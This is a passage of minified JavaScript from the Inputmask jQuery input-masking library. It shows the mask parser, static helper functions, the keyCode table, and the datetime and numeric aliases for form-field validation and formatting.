                    this.matches = [], this.openGroup = t || !1, this.alternatorGroup = !1, this.isGroup = t || !1, this.isOptional = e || !1, this.isQuantifier = n || !1, this.isAlternator = i || !1, this.quantifier = {
                        min: 1,
                        max: 1
                    }
                }

                function b(e, r, s) {
                    s = s !== i ? s : e.matches.length;
                    var a = e.matches[s - 1];
                    if (n) 0 === r.indexOf("[") || f && /\\d|\\s|\\w]/i.test(r) || "." === r ? e.matches.splice(s++, 0, {
                        fn: new RegExp(r, o.casing ? "i" : ""),
                        optionality: !1,
                        newBlockMarker: a === i ? "master" : a.def !== r,
                        casing: null,
                        def: r,
                        placeholder: i,
                        nativeDef: r
                    }) : (f && (r = r[r.length - 1]), t.each(r.split(""), (function(t, n) {
                        a = e.matches[s - 1], e.matches.splice(s++, 0, {
                            fn: null,
                            optionality: !1,
                            newBlockMarker: a === i ? "master" : a.def !== n && null !== a.fn,
                            casing: null,
                            def: o.staticDefinitionSymbol || n,
                            placeholder: o.staticDefinitionSymbol !== i ? n : i,
                            nativeDef: (f ? "'" : "") + n
                        })
                    }))), f = !1;
                    else {
                        var l = (o.definitions ? o.definitions[r] : i) || c.prototype.definitions[r];
                        l && !f ? e.matches.splice(s++, 0, {
                            fn: l.validator ? "string" == typeof l.validator ? new RegExp(l.validator, o.casing ? "i" : "") : new function() {
                                this.test = l.validator
                            } : new RegExp("."),
                            optionality: !1,
                            newBlockMarker: a === i ? "master" : a.def !== (l.definitionSymbol || r),
                            casing: l.casing,
                            def: l.definitionSymbol || r,
                            placeholder: l.placeholder,
                            nativeDef: r
                        }) : (e.matches.splice(s++, 0, {
                            fn: null,
                            optionality: !1,
                            newBlockMarker: a === i ? "master" : a.def !== r && null !== a.fn,
                            casing: null,
                            def: o.staticDefinitionSymbol || r,
                            placeholder: o.staticDefinitionSymbol !== i ? r : i,
                            nativeDef: (f ? "'" : "") + r
                        }), f = !1)
                    }
                }

                function x(e) {
                    e && e.matches && t.each(e.matches, (function(t, r) {
                        var s = e.matches[t + 1];
                        (s === i || s.matches === i || !1 === s.isQuantifier) && r && r.isGroup && (r.isGroup = !1, n || (b(r, o.groupmarker[0], 0), !0 !== r.openGroup && b(r, o.groupmarker[1]))), x(r)
                    }))
                }

                function w() {
                    if (g.length > 0) {
                        if (b(l = g[g.length - 1], s), l.isAlternator) {
                            u = g.pop();
                            for (var t = 0; t < u.matches.length; t++) u.matches[t].isGroup && (u.matches[t].isGroup = !1);
                            g.length > 0 ? (l = g[g.length - 1]).matches.push(u) : m.matches.push(u)
                        }
                    } else b(m, s)
                }

                function k(t) {
                    function e(t) {
                        return t === o.optionalmarker[0] ? t = o.optionalmarker[1] : t === o.optionalmarker[1] ? t = o.optionalmarker[0] : t === o.groupmarker[0] ? t = o.groupmarker[1] : t === o.groupmarker[1] && (t = o.groupmarker[0]), t
                    }
                    for (var n in t.matches = t.matches.reverse(), t.matches)
                        if (t.matches.hasOwnProperty(n)) {
                            var r = parseInt(n);
                            if (t.matches[n].isQuantifier && t.matches[r + 1] && t.matches[r + 1].isGroup) {
                                var s = t.matches[n];
                                t.matches.splice(n, 1), t.matches.splice(r + 1, 0, s)
                            }
                            t.matches[n].matches !== i ? t.matches[n] = k(t.matches[n]) : t.matches[n] = e(t.matches[n])
                        }
                    return t
                }

                function C(t) {
                    var e = new y(!0);
                    return e.openGroup = !1, e.matches = t, e
                }
                for (n && (o.optionalmarker[0] = i, o.optionalmarker[1] = i); r = n ? d.exec(e) : h.exec(e);) {
                    if (s = r[0], n) switch (s.charAt(0)) {
                        case "?":
                            s = "{0,1}";
                            break;
                        case "+":
                        case "*":
                            s = "{" + s + "}"
                    }
                    if (f) w();
                    else switch (s.charAt(0)) {
                        case "(?=":
                        case "(?!":
                        case "(?<=":
                        case "(?<!":
                            break;
                        case o.escapeChar:
                            f = !0, n && w();
                            break;
                        case o.optionalmarker[1]:
                        case o.groupmarker[1]:
                            if ((a = g.pop()).openGroup = !1, a !== i)
                                if (g.length > 0) {
                                    if ((l = g[g.length - 1]).matches.push(a), l.isAlternator) {
                                        u = g.pop();
                                        for (var _ = 0; _ < u.matches.length; _++) u.matches[_].isGroup = !1, u.matches[_].alternatorGroup = !1;
                                        g.length > 0 ? (l = g[g.length - 1]).matches.push(u) : m.matches.push(u)
                                    }
                                } else m.matches.push(a);
                            else w();
                            break;
                        case o.optionalmarker[0]:
                            g.push(new y(!1, !0));
                            break;
                        case o.groupmarker[0]:
                            g.push(new y(!0));
                            break;
                        case o.quantifiermarker[0]:
                            var S = new y(!1, !1, !0),
                                T = (s = s.replace(/[{}]/g, "")).split("|"),
                                E = T[0].split(","),
                                P = isNaN(E[0]) ? E[0] : parseInt(E[0]),
                                $ = 1 === E.length ? P : isNaN(E[1]) ? E[1] : parseInt(E[1]);
                            "*" !== P && "+" !== P || (P = "*" === $ ? 0 : 1), S.quantifier = {
                                min: P,
                                max: $,
                                jit: T[1]
                            };
                            var A = g.length > 0 ? g[g.length - 1].matches : m.matches;
                            if ((r = A.pop()).isAlternator) {
                                A.push(r), A = r.matches;
                                var D = new y(!0),
                                    M = A.pop();
                                A.push(D), A = D.matches, r = M
                            }
                            r.isGroup || (r = C([r])), A.push(r), A.push(S);
                            break;
                        case o.alternatormarker:
                            var O = function(t) {
                                var e = t.pop();
                                return e.isQuantifier && (e = C([t.pop(), e])), e
                            };
                            if (g.length > 0) {
                                var j = (l = g[g.length - 1]).matches[l.matches.length - 1];
                                p = l.openGroup && (j.matches === i || !1 === j.isGroup && !1 === j.isAlternator) ? g.pop() : O(l.matches)
                            } else p = O(m.matches);
                            if (p.isAlternator) g.push(p);
                            else if (p.alternatorGroup ? (u = g.pop(), p.alternatorGroup = !1) : u = new y(!1, !1, !1, !0), u.matches.push(p), g.push(u), p.openGroup) {
                                p.openGroup = !1;
                                var L = new y(!0);
                                L.alternatorGroup = !0, g.push(L)
                            }
                            break;
                        default:
                            w()
                    }
                }
                for (; g.length > 0;) a = g.pop(), m.matches.push(a);
                return m.matches.length > 0 && (x(m), v.push(m)), (o.numericInput || o.isRTL) && k(v[0]), v
            }
        }, c.extendDefaults = function(e) {
            t.extend(!0, c.prototype.defaults, e)
        }, c.extendDefinitions = function(e) {
            t.extend(!0, c.prototype.definitions, e)
        }, c.extendAliases = function(e) {
            t.extend(!0, c.prototype.aliases, e)
        }, c.format = function(t, e, n) {
            return c(e).format(t, n)
        }, c.unmask = function(t, e) {
            return c(e).unmaskedvalue(t)
        }, c.isValid = function(t, e) {
            return c(e).isValid(t)
        }, c.remove = function(e) {
            "string" == typeof e && (e = n.getElementById(e) || n.querySelectorAll(e)), e = e.nodeName ? [e] : e, t.each(e, (function(t, e) {
                e.inputmask && e.inputmask.remove()
            }))
        }, c.setValue = function(e, i) {
            "string" == typeof e && (e = n.getElementById(e) || n.querySelectorAll(e)), e = e.nodeName ? [e] : e, t.each(e, (function(e, n) {
                n.inputmask ? n.inputmask.setValue(i) : t(n).trigger("setvalue", [i])
            }))
        }, c.escapeRegex = function(t) {
            var e = ["/", ".", "*", "+", "?", "|", "(", ")", "[", "]", "{", "}", "\\", "$", "^"];
            return t.replace(new RegExp("(\\" + e.join("|\\") + ")", "gim"), "\\$1")
        }, c.keyCode = {
            BACKSPACE: 8,
            BACKSPACE_SAFARI: 127,
            DELETE: 46,
            DOWN: 40,
            END: 35,
            ENTER: 13,
            ESCAPE: 27,
            HOME: 36,
            INSERT: 45,
            LEFT: 37,
            PAGE_DOWN: 34,
            PAGE_UP: 33,
            RIGHT: 39,
            SPACE: 32,
            TAB: 9,
            UP: 38,
            X: 88,
            CONTROL: 17
        }, c.dependencyLib = t, c
    }) ? i.apply(e, o) : i) || (t.exports = r)
}, function(t, e, n) {
    "use strict";
    var i, o, r;
    "function" == typeof Symbol && Symbol.iterator;
    o = [n(4)], void 0 === (r = "function" == typeof(i = function(t) {
        return t
    }) ? i.apply(e, o) : i) || (t.exports = r)
}, function(t, e) {
    t.exports = jQuery
}, function(t, e, n) {
    "use strict";
    var i;
    "function" == typeof Symbol && Symbol.iterator;
    void 0 === (i = function() {
        return window
    }.call(e, n, e, t)) || (t.exports = i)
}, function(t, e, n) {
    "use strict";
    var i;
    "function" == typeof Symbol && Symbol.iterator;
    void 0 === (i = function() {
        return document
    }.call(e, n, e, t)) || (t.exports = i)
}, function(t, e, n) {
    "use strict";
    var i, o, r, s = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
        return typeof t
    } : function(t) {
        return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
    };
    o = [n(2)], void 0 === (r = "function" == typeof(i = function(t) {
        var e = t.dependencyLib,
            n = {
                d: ["[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", Date.prototype.getDate],
                dd: ["0[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", function() {
                    return c(Date.prototype.getDate.call(this), 2)
                }],
                ddd: [""],
                dddd: [""],
                m: ["[1-9]|1[012]", Date.prototype.setMonth, "month", function() {
                    return Date.prototype.getMonth.call(this) + 1
                }],
                mm: ["0[1-9]|1[012]", Date.prototype.setMonth, "month", function() {
                    return c(Date.prototype.getMonth.call(this) + 1, 2)
                }],
                mmm: [""],
                mmmm: [""],
                yy: ["[0-9]{2}", Date.prototype.setFullYear, "year", function() {
                    return c(Date.prototype.getFullYear.call(this), 2)
                }],
                yyyy: ["[0-9]{4}", Date.prototype.setFullYear, "year", function() {
                    return c(Date.prototype.getFullYear.call(this), 4)
                }],
                h: ["[1-9]|1[0-2]", Date.prototype.setHours, "hours", Date.prototype.getHours],
                hh: ["0[1-9]|1[0-2]", Date.prototype.setHours, "hours", function() {
                    return c(Date.prototype.getHours.call(this), 2)
                }],
                hhh: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours],
                H: ["1?[0-9]|2[0-3]", Date.prototype.setHours, "hours", Date.prototype.getHours],
                HH: ["[01][0-9]|2[0-3]", Date.prototype.setHours, "hours", function() {
                    return c(Date.prototype.getHours.call(this), 2)
                }],
                HHH: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours],
                M: ["[1-5]?[0-9]", Date.prototype.setMinutes, "minutes", Date.prototype.getMinutes],
                MM: ["[0-5][0-9]", Date.prototype.setMinutes, "minutes", function() {
                    return c(Date.prototype.getMinutes.call(this), 2)
                }],
                s: ["[1-5]?[0-9]", Date.prototype.setSeconds, "seconds", Date.prototype.getSeconds],
                ss: ["[0-5][0-9]", Date.prototype.setSeconds, "seconds", function() {
                    return c(Date.prototype.getSeconds.call(this), 2)
                }],
                l: ["[0-9]{3}", Date.prototype.setMilliseconds, "milliseconds", function() {
                    return c(Date.prototype.getMilliseconds.call(this), 3)
                }],
                L: ["[0-9]{2}", Date.prototype.setMilliseconds, "milliseconds", function() {
                    return c(Date.prototype.getMilliseconds.call(this), 2)
                }],
                t: ["[ap]"],
                tt: ["[ap]m"],
                T: ["[AP]"],
                TT: ["[AP]M"],
                Z: [""],
                o: [""],
                S: [""]
            },
            i = {
                isoDate: "yyyy-mm-dd",
                isoTime: "HH:MM:ss",
                isoDateTime: "yyyy-mm-dd'T'HH:MM:ss",
                isoUtcDateTime: "UTC:yyyy-mm-dd'T'HH:MM:ss'Z'"
            };

        function o(t) {
            if (!t.tokenizer) {
                var e = [];
                for (var i in n) - 1 === e.indexOf(i[0]) && e.push(i[0]);
                t.tokenizer = "(" + e.join("+|") + ")+?|.", t.tokenizer = new RegExp(t.tokenizer, "g")
            }
            return t.tokenizer
        }

        function r(t, e) {
            return (!isFinite(t.rawday) || "29" == t.day && !isFinite(t.rawyear) || new Date(t.date.getFullYear(), isFinite(t.rawmonth) ? t.month : t.date.getMonth() + 1, 0).getDate() >= t.day) && e
        }

        function a(t, e) {
            var n = !0;
            if (e.min) {
                if (t.rawyear) {
                    var i = t.rawyear.replace(/[^0-9]/g, "");
                    n = e.min.year.substr(0, i.length) <= i
                }
                t.year === t.rawyear && e.min.date.getTime() == e.min.date.getTime() && (n = e.min.date.getTime() <= t.date.getTime())
            }
            return n && e.max && e.max.date.getTime() == e.max.date.getTime() && (n = e.max.date.getTime() >= t.date.getTime()), n
        }

        function l(e, i, r, s) {
            for (var a, l = ""; a = o(r).exec(e);)
                if (void 0 === i)
                    if (n[a[0]]) l += "(" + n[a[0]][0] + ")";
                    else switch (a[0]) {
                        case "[":
                            l += "(";
                            break;
                        case "]":
                            l += ")?";
                            break;
                        default:
                            l += t.escapeRegex(a[0])
                    } else n[a[0]] ? !0 !== s && n[a[0]][3] ? l += n[a[0]][3].call(i.date) : n[a[0]][2] ? l += i["raw" + n[a[0]][2]] : l += a[0] : l += a[0];
            return l
        }

        function c(t, e) {
            for (t = String(t), e = e || 2; t.length < e;) t = "0" + t;
            return t
        }

        function u(t, e, i) {
            var r, a, l, c, u = {
                    date: new Date(1, 0, 1)
                },
                p = t;

            function h(t) {
                var e;
                if (i.min && i.min[r] || i.max && i.max[r]) {
                    var n = i.min && i.min[r] || i.max[r],
                        o = i.max && i.max[r] || i.min[r];
                    for (e = t.replace(/[^0-9]/g, ""), e += (n.indexOf(e) < o.indexOf(e) ? o : n).toString().substr(e.length); !new RegExp(c).test(e);) e--
                } else e = t.replace(/[^0-9]/g, "0");
                return e
            }

            function d(t, e, n) {
                t[r] = h(e), t["raw" + r] = e, void 0 !== l && l.call(t.date, "month" == r ? parseInt(t[r]) - 1 : t[r])
            }
            if ("string" == typeof p) {
                for (; a = o(i).exec(e);) {
                    var f = p.slice(0, a[0].length);
                    n.hasOwnProperty(a[0]) && (c = n[a[0]][0], r = n[a[0]][2], l = n[a[0]][1], d(u, f, i)), p = p.slice(f.length)
                }
                return u
            }
            if (p && "object" === (void 0 === p ? "undefined" : s(p)) && p.hasOwnProperty("date")) return p
        }
        return t.extendAliases({
            datetime: {
                mask: function(t) {
                    return n.S = t.i18n.ordinalSuffix.join("|"), t.inputFormat = i[t.inputFormat] || t.inputFormat, t.displayFormat = i[t.displayFormat] || t.displayFormat || t.inputFormat, t.outputFormat = i[t.outputFormat] || t.outputFormat || t.inputFormat, t.placeholder = "" !== t.placeholder ? t.placeholder : t.inputFormat.replace(/[\[\]]/, ""), t.regex = l(t.inputFormat, void 0, t), null
                },
                placeholder: "",
                inputFormat: "isoDateTime",
                displayFormat: void 0,
                outputFormat: void 0,
                min: null,
                max: null,
                i18n: {
                    dayNames: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"],
                    monthNames: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
                    ordinalSuffix: ["st", "nd", "rd", "th"]
                },
                postValidation: function(t, e, n, i) {
                    i.min = u(i.min, i.inputFormat, i), i.max = u(i.max, i.inputFormat, i);
                    var o = n,
                        s = u(t.join(""), i.inputFormat, i);
                    return o && s.date.getTime() == s.date.getTime() && (o = (o = r(s, o)) && a(s, i)), e && o && n.pos !== e ? {
                        buffer: l(i.inputFormat, s, i),
                        refreshFromBuffer: {
                            start: e,
                            end: n.pos
                        }
                    } : o
                },
                onKeyDown: function(n, i, r, s) {
                    var a = this;
                    if (n.ctrlKey && n.keyCode === t.keyCode.RIGHT) {
                        for (var l, u = new Date, p = ""; l = o(s).exec(s.inputFormat);) "d" === l[0].charAt(0) ? p += c(u.getDate(), l[0].length) : "m" === l[0].charAt(0) ? p += c(u.getMonth() + 1, l[0].length) : "yyyy" === l[0] ? p += u.getFullYear().toString() : "y" === l[0].charAt(0) && (p += c(u.getYear(), l[0].length));
                        a.inputmask._valueSet(p), e(a).trigger("setvalue")
                    }
                },
                onUnMask: function(t, e, n) {
                    return l(n.outputFormat, u(t, n.inputFormat, n), n, !0)
                },
                casing: function(t, e, n, i) {
                    return 0 == e.nativeDef.indexOf("[ap]") ? t.toLowerCase() : 0 == e.nativeDef.indexOf("[AP]") ? t.toUpperCase() : t
                },
                insertMode: !1
            }
        }), t
    }) ? i.apply(e, o) : i) || (t.exports = r)
}, function(t, e, n) {
    "use strict";
    var i, o, r;
    "function" == typeof Symbol && Symbol.iterator;
    o = [n(2)], void 0 === (r = "function" == typeof(i = function(t) {
        var e = t.dependencyLib;

        function n(e, n) {
            for (var i = "", o = 0; o < e.length; o++) t.prototype.definitions[e.charAt(o)] || n.definitions[e.charAt(o)] || n.optionalmarker.start === e.charAt(o) || n.optionalmarker.end === e.charAt(o) || n.quantifiermarker.start === e.charAt(o) || n.quantifiermarker.end === e.charAt(o) || n.groupmarker.start === e.charAt(o) || n.groupmarker.end === e.charAt(o) || n.alternatormarker === e.charAt(o) ? i += "\\" + e.charAt(o) : i += e.charAt(o);
            return i
        }

        function i(t, n) {
            if (n.numericInput) {
                var i = e.inArray(n.radixPoint, t); - 1 === i && (t.push(n.radixPoint), i = t.length - 1);
                for (var o = 1; o <= n.digits; o++) t[i + o] = t[i + o] || "0"
            }
            return t
        }
        return t.extendAliases({
            numeric: {
                mask: function(t) {
                    if (0 !== t.repeat && isNaN(t.integerDigits) && (t.integerDigits = t.repeat), t.repeat = 0, t.groupSeparator === t.radixPoint && t.digits && "0" !== t.digits && ("." === t.radixPoint ? t.groupSeparator = "," : "," === t.radixPoint ? t.groupSeparator = "." : t.groupSeparator = ""), " " === t.groupSeparator && (t.skipOptionalPartCharacter = void 0), t.autoGroup = t.autoGroup && "" !== t.groupSeparator, t.autoGroup && ("string" == typeof t.groupSize && isFinite(t.groupSize) && (t.groupSize = parseInt(t.groupSize)), isFinite(t.integerDigits))) {
                        var e = Math.floor(t.integerDigits / t.groupSize),
                            i = t.integerDigits % t.groupSize;
                        t.integerDigits = parseInt(t.integerDigits) + (0 === i ? e - 1 : e), t.integerDigits < 1 && (t.integerDigits = "*")
                    }
                    t.placeholder.length > 1 && (t.placeholder = t.placeholder.charAt(0)), "radixFocus" === t.positionCaretOnClick && "" === t.placeholder && !1 === t.integerOptional && (t.positionCaretOnClick = "lvp"), t.definitions[";"] = t.definitions["~"], t.definitions[";"].definitionSymbol = "~", !0 === t.numericInput && (t.positionCaretOnClick = "radixFocus" === t.positionCaretOnClick ? "lvp" : t.positionCaretOnClick, t.digitsOptional = !1, isNaN(t.digits) && (t.digits = 2), t.decimalProtect = !1);
                    var o = "[+]";
                    if (o += n(t.prefix, t), !0 === t.integerOptional ? o += "~{1," + t.integerDigits + "}" : o += "~{" + t.integerDigits + "}", void 0 !== t.digits) {
                        var r = t.decimalProtect ? ":" : t.radixPoint,
                            s = t.digits.toString().split(",");
                        isFinite(s[0]) && s[1] && isFinite(s[1]) ? o += r + ";{" + t.digits + "}" : (isNaN(t.digits) || parseInt(t.digits) > 0) && (t.digitsOptional ? o += "[" + r + ";{1," + t.digits + "}]" : o += r + ";{" + t.digits + "}")
                    }
                    return o += n(t.suffix, t), o += "[-]", t.greedy = !1, o
                },
                placeholder: "",
                greedy: !1,
                digits: "*",
                digitsOptional: !0,
                enforceDigitsOnBlur: !1,
                radixPoint: ".",
                positionCaretOnClick: "radixFocus",
                groupSize: 3,
                groupSeparator: "",
                autoGroup: !1,
                allowMinus: !0,
                negationSymbol: {
                    front: "-",
                    back: ""
                },
                integerDigits: "+",
                integerOptional: !0,
                prefix: "",
                suffix: "",
                rightAlign: !0,
                decimalProtect: !0,
                min: null,
                max: null,
                step: 1,
                insertMode: !0,
                autoUnmask: !1,
                unmaskAsNumber: !1,
                inputmode: "numeric",
                preValidation: function(t, n, i, o, r, s) {
                    if ("-" === i || i === r.negationSymbol.front) return !0 === r.allowMinus && (r.isNegative = void 0 === r.isNegative || !r.isNegative, "" === t.join("") || {
                        caret: s.validPositions[n] ? n : void 0,
                        dopost: !0
                    });
                    if (!1 === o && i === r.radixPoint && void 0 !== r.digits && (isNaN(r.digits) || parseInt(r.digits) > 0)) {
                        var a = e.inArray(r.radixPoint, t);
                        if (-1 !== a && void 0 !== s.validPositions[a]) return !0 === r.numericInput ? n === a : {
                            caret: a + 1
                        }
                    }
                    return !0
                },
                postValidation: function(n, i, o, r) {
                    function s(t, e) {
                        var n = "";
                        if (n += "(" + e.groupSeparator + "*{" + e.groupSize + "}){*}", "" !== e.radixPoint) {
                            var i = t.join("").split(e.radixPoint);
                            i[1] && (n += e.radixPoint + "*{" + i[1].match(/^\d*\??\d*/)[0].length + "}")
                        }
                        return n
                    }
                    var a = r.suffix.split(""),
                        l = r.prefix.split("");
                    if (void 0 === o.pos && void 0 !== o.caret && !0 !== o.dopost) return o;
                    var c = void 0 !== o.caret ? o.caret : o.pos,
                        u = n.slice();
                    r.numericInput && (c = u.length - c - 1, u = u.reverse());
                    var p = u[c];
                    if (p === r.groupSeparator && (p = u[c += 1]), c === u.length - r.suffix.length - 1 && p === r.radixPoint) return o;
                    void 0 !== p && p !== r.radixPoint && p !== r.negationSymbol.front && p !== r.negationSymbol.back && (u[c] = "?", r.prefix.length > 0 && c >= (!1 === r.isNegative ? 1 : 0) && c < r.prefix.length - 1 + (!1 === r.isNegative ? 1 : 0) ? l[c - (!1 === r.isNegative ? 1 : 0)] = "?" : r.suffix.length > 0 && c >= u.length - r.suffix.length - (!1 === r.isNegative ? 1 : 0) && (a[c - (u.length - r.suffix.length - (!1 === r.isNegative ? 1 : 0))] = "?")), l = l.join(""), a = a.join("");
                    var h = u.join("").replace(l, "");
                    if (h = (h = (h = (h = h.replace(a, "")).replace(new RegExp(t.escapeRegex(r.groupSeparator), "g"), "")).replace(new RegExp("[-" + t.escapeRegex(r.negationSymbol.front) + "]", "g"), "")).replace(new RegExp(t.escapeRegex(r.negationSymbol.back) + "$"), ""), isNaN(r.placeholder) && (h = h.replace(new RegExp(t.escapeRegex(r.placeholder), "g"), "")), h.length > 1 && 1 !== h.indexOf(r.radixPoint) && ("0" === p && (h = h.replace(/^\?/g, "")), h = h.replace(/^0/g, "")), h.charAt(0) === r.radixPoint && "" !== r.radixPoint && !0 !== r.numericInput && (h = "0" + h), "" !== h) {
                        if (h = h.split(""), (!r.digitsOptional || r.enforceDigitsOnBlur && "blur" === o.event) && isFinite(r.digits)) {
                            var d = e.inArray(r.radixPoint, h),
                                f = e.inArray(r.radixPoint, u); - 1 === d && (h.push(r.radixPoint), d = h.length - 1);
                            for (var m = 1; m <= r.digits; m++) r.digitsOptional && (!r.enforceDigitsOnBlur || "blur" !== o.event) || void 0 !== h[d + m] && h[d + m] !== r.placeholder.charAt(0) ? -1 !== f && void 0 !== u[f + m] && (h[d + m] = h[d + m] || u[f + m]) : h[d + m] = o.placeholder || r.placeholder.charAt(0)
                        }
                        if (!0 !== r.autoGroup || "" === r.groupSeparator || p === r.radixPoint && void 0 === o.pos && !o.dopost) h = h.join("");
                        else {
                            var g = h[h.length - 1] === r.radixPoint && o.c === r.radixPoint;
                            h = t(s(h, r), {
                                numericInput: !0,
                                jitMasking: !0,
                                definitions: {
                                    "*": {
                                        validator: "[0-9?]",
                                        cardinality: 1
                                    }
                                }
                            }).format(h.join("")), g && (h += r.radixPoint), h.charAt(0) === r.groupSeparator && h.substr(1)
                        }
                    }
                    if (r.isNegative && "blur" === o.event && (r.isNegative = "0" !== h), h = l + h, h += a, r.isNegative && (h = r.negationSymbol.front + h, h += r.negationSymbol.back), h = h.split(""), void 0 !== p)
                        if (p !== r.radixPoint && p !== r.negationSymbol.front && p !== r.negationSymbol.back)(c = e.inArray("?", h)) > -1 ? h[c] = p : c = o.caret || 0;
                        else if (p === r.radixPoint || p === r.negationSymbol.front || p === r.negationSymbol.back) {
                        var v = e.inArray(p, h); - 1 !== v && (c = v)
                    }
                    r.numericInput && (c = h.length - c - 1, h = h.reverse());
                    var y = {
                        caret: void 0 !== p && void 0 === o.pos || void 0 === c ? c : c + (r.numericInput ? -1 : 1),
                        buffer: h,
                        refreshFromBuffer: o.dopost || n.join("") !== h.join("")
                    };
                    return y.refreshFromBuffer ? y : o
                },
                onBeforeWrite: function(n, i, o, r) {
                    function s(e) {
                        void 0 === e.parseMinMaxOptions && (null !== e.min && (e.min = e.min.toString().replace(new RegExp(t.escapeRegex(e.groupSeparator), "g"), ""), "," === e.radixPoint && (e.min = e.min.replace(e.radixPoint, ".")), e.min = isFinite(e.min) ? parseFloat(e.min) : NaN, isNaN(e.min) && (e.min = Number.MIN_VALUE)), null !== e.max && (e.max = e.max.toString().replace(new RegExp(t.escapeRegex(e.groupSeparator), "g"), ""), "," === e.radixPoint && (e.max = e.max.replace(e.radixPoint, ".")), e.max = isFinite(e.max) ? parseFloat(e.max) : NaN, isNaN(e.max) && (e.max = Number.MAX_VALUE)), e.parseMinMaxOptions = "done")
                    }
                    if (n) switch (n.type) {
                        case "keydown":
                            return r.postValidation(i, o, {
                                caret: o,
                                dopost: !0
                            }, r);
                        case "blur":
                        case "checkval":
                            var a;
                            if (s(r), null !== r.min || null !== r.max) {
                                if (a = r.onUnMask(i.join(""), void 0, e.extend({}, r, {
                                        unmaskAsNumber: !0
                                    })), null !== r.min && a < r.min) return r.isNegative = r.min < 0, r.postValidation(r.min.toString().replace(".", r.radixPoint).split(""), o, {
                                    caret: o,
                                    dopost: !0,
                                    placeholder: "0"
                                }, r);
                                if (null !== r.max && a > r.max) return r.isNegative = r.max < 0, r.postValidation(r.max.toString().replace(".", r.radixPoint).split(""), o, {
                                    caret: o,
                                    dopost: !0,
                                    placeholder: "0"
                                }, r)
                            }
                            return r.postValidation(i, o, {
                                caret: o,
                                placeholder: "0",
                                event: "blur"
                            }, r);
                        case "_checkval":
                            return {
                                caret: o
                            }
                    }
                },
                regex: {
                    integerPart: function(e, n) {
                        return n ? new RegExp("[" + t.escapeRegex(e.negationSymbol.front) + "+]?") : new RegExp("[" + t.escapeRegex(e.negationSymbol.front) + "+]?\\d+")
                    },
                    integerNPart: function(e) {
                        return new RegExp("[\\d" + t.escapeRegex(e.groupSeparator) + t.escapeRegex(e.placeholder.charAt(0)) + "]+")
                    }
                },
                definitions: {
                    "~": {
                        validator: function(e, n, i, o, r, s) {
                            var a;
                            if ("k" === e || "m" === e) {
                                a = {
                                    insert: [],
                                    c: 0
                                };
                                for (var l = 0, c = "k" === e ? 2 : 5; l < c; l++) a.insert.push({
                                    pos: i + l,
                                    c: 0
                                });
                                return a.pos = i + c, a
                            }
                            if (!0 === (a = o ? new RegExp("[0-9" + t.escapeRegex(r.groupSeparator) + "]").test(e) : new RegExp("[0-9]").test(e))) {
                                if (!0 !== r.numericInput && void 0 !== n.validPositions[i] && "~" === n.validPositions[i].match.def && !s) {
                                    var u = n.buffer.join(""),
                                        p = (u = (u = u.replace(new RegExp("[-" + t.escapeRegex(r.negationSymbol.front) + "]", "g"), "")).replace(new RegExp(t.escapeRegex(r.negationSymbol.back) + "$"), "")).split(r.radixPoint);
                                    p.length > 1 && (p[1] = p[1].replace(/0/g, r.placeholder.charAt(0))), "0" === p[0] && (p[0] = p[0].replace(/0/g, r.placeholder.charAt(0))), u = p[0] + r.radixPoint + p[1] || "";
                                    var h = n._buffer.join("");
                                    for (u === r.radixPoint && (u = h); null === u.match(t.escapeRegex(h) + "$");) h = h.slice(1);
                                    a = void 0 === (u = (u = u.replace(h, "")).split(""))[i] ? {
                                        pos: i,
                                        remove: i
                                    } : {
                                        pos: i
                                    }
                                }
                            } else o || e !== r.radixPoint || void 0 !== n.validPositions[i - 1] || (a = {
                                insert: {
                                    pos: i,
                                    c: 0
                                },
                                pos: i + 1
                            });
                            return a
                        },
                        cardinality: 1
                    },
                    "+": {
                        validator: function(t, e, n, i, o) {
                            return o.allowMinus && ("-" === t || t === o.negationSymbol.front)
                        },
                        cardinality: 1,
                        placeholder: ""
                    },
                    "-": {
                        validator: function(t, e, n, i, o) {
                            return o.allowMinus && t === o.negationSymbol.back
                        },
                        cardinality: 1,
                        placeholder: ""
                    },
                    ":": {
                        validator: function(e, n, i, o, r) {
                            var s = "[" + t.escapeRegex(r.radixPoint) + "]",
                                a = new RegExp(s).test(e);
                            return a && n.validPositions[i] && n.validPositions[i].match.placeholder === r.radixPoint && (a = {
                                caret: i + 1
                            }), a
                        },
                        cardinality: 1,
                        placeholder: function(t) {
                            return t.radixPoint
                        }
                    }
                },
                onUnMask: function(e, n, i) {
                    if ("" === n && !0 === i.nullable) return n;
                    var o = e.replace(i.prefix, "");
                    return o = (o = o.replace(i.suffix, "")).replace(new RegExp(t.escapeRegex(i.groupSeparator), "g"), ""), "" !== i.placeholder.charAt(0) && (o = o.replace(new RegExp(i.placeholder.charAt(0), "g"), "0")), i.unmaskAsNumber ? ("" !== i.radixPoint && -1 !== o.indexOf(i.radixPoint) && (o = o.replace(t.escapeRegex.call(this, i.radixPoint), ".")), o = (o = o.replace(new RegExp("^" + t.escapeRegex(i.negationSymbol.front)), "-")).replace(new RegExp(t.escapeRegex(i.negationSymbol.back) + "$"), ""), Number(o)) : o
                },
                isComplete: function(e, n) {
                    var i = (n.numericInput ? e.slice().reverse() : e).join("");
                    return i = (i = (i = (i = (i = i.replace(new RegExp("^" + t.escapeRegex(n.negationSymbol.front)), "-")).replace(new RegExp(t.escapeRegex(n.negationSymbol.back) + "$"), "")).replace(n.prefix, "")).replace(n.suffix, "")).replace(new RegExp(t.escapeRegex(n.groupSeparator) + "([0-9]{3})", "g"), "$1"), "," === n.radixPoint && (i = i.replace(t.escapeRegex(n.radixPoint), ".")), isFinite(i)
                },
                onBeforeMask: function(e, n) {
                    if (n.isNegative = void 0, "number" == typeof e && "" !== n.radixPoint && (e = e.toString().replace(".", n.radixPoint)), e = e.toString().charAt(e.length - 1) === n.radixPoint ? e.toString().substr(0, e.length - 1) : e.toString(), "" !== n.radixPoint && isFinite(e)) {
